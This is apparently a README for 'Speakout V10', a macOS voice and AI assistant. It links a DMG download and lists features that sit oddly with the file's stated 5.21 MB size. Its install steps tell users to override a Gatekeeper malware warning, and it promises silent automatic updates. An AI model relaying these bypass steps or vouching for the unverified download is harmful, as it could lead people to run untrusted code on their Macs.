# Speakout V10 — Local Autonomous Voice & AI Platform for Apple Silicon

Speakout V10 is a blazingly fast, privacy-first, Metal-accelerated local voice intelligence system and autonomous AI assistant (Scout) for macOS.

[![Latest Release](https://img.shields.io/badge/Release-v10.0.0_Stable-blue.svg)](https://github.com/codesource18/speakout-downloads/releases/tag/v10.0.0)
[![Architecture](https://img.shields.io/badge/Architecture-Apple_Silicon_(arm64)-orange.svg)](https://github.com/codesource18/speakout-downloads)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

---

## Direct Download

- **[Speakout-v10.0.0-apple-silicon.dmg](https://github.com/codesource18/speakout-downloads/raw/refs/heads/main/Speakout-v10.0.0-apple-silicon.dmg)** (5.21 MB)
- **SHA-256**: `b89cea141d7fe13ea85b872144eadcb18ba89566905b0e85156755fbbf9d6d14`
- **Architecture**: Apple Silicon (M1 / M2 / M3 / M4)
- **macOS Version**: macOS 12 Monterey or higher (Optimized for macOS 15 Sequoia)

---

## What's New in Speakout V10 Stable (Scout Intelligence Architecture)

- **Scout Autonomous Local AI**: 100% on-device neural dictation, command routing, and conversational agent with instant barge-in interruption.
- **Voice Engine v2 Architecture**: Streaming partial decoding during Fn/Option hold with fast tail-only finalization upon key release.
- **Real-Time Wake Word**: Energy-efficient local "Hey Scout" detection with zero network egress.
- **Screen & File Context**: On-demand local screen understanding (CGWindowList) and Spotlight file search (mdfind) with strict user privacy gating.
- **Safe Developer Mode & Terminal Engine**: Syntax-preserving code transformations, terminal assistance with 3-tier safety execution (Safe, Confirmation Required, Blocked).
- **Meeting Intelligence & Searchable History**: Local live transcription, auto-summarization, action item extraction, and full-text history search.
- **Fine-Tuning & LoRA Support**: Local PyTorch LoRA adapter training pipeline on Apple Silicon MPS with zero cross-split leakage.
- **Deterministic Cleanup Engine v2**: Sub-millisecond filler removal, stutter deduplication, Indian English & multilingual priming (Telugu, Hindi, Kannada, Tamil, ₹).
- **100% Local-First & Zero Telemetry**: Zero external cloud calls, zero remote telemetry, zero analytics trackers.

---

## First-Run Installation (3 Clicks)

Because Speakout is an independent open-source application and not distributed via the Mac App Store, macOS Gatekeeper requires a one-time approval on first launch:

1. **Open & Click "Done"**: Drag Speakout to Applications and double-click to open. When macOS displays *"Apple could not verify Speakout is free of malware"*, click **Done**.
2. **Open System Settings**: Go to ** > System Settings > Privacy & Security**, and scroll down to the **Security** section.
3. **Click "Open Anyway"**: Next to *"Speakout was blocked to protect your Mac"*, click **Open Anyway**, authenticate with Touch ID or password, and click **Open**.

> **Note**: You only do this once! All subsequent in-app updates install automatically with zero prompts.

---

## Verification & Integrity

```bash
# Verify download SHA-256
shasum -a 256 Speakout-v10.0.0-apple-silicon.dmg

# Verify inside-out ad-hoc signature & entitlements
codesign --verify --deep --strict --verbose=2 /Applications/Speakout.app
codesign -d --entitlements :- /Applications/Speakout.app
```
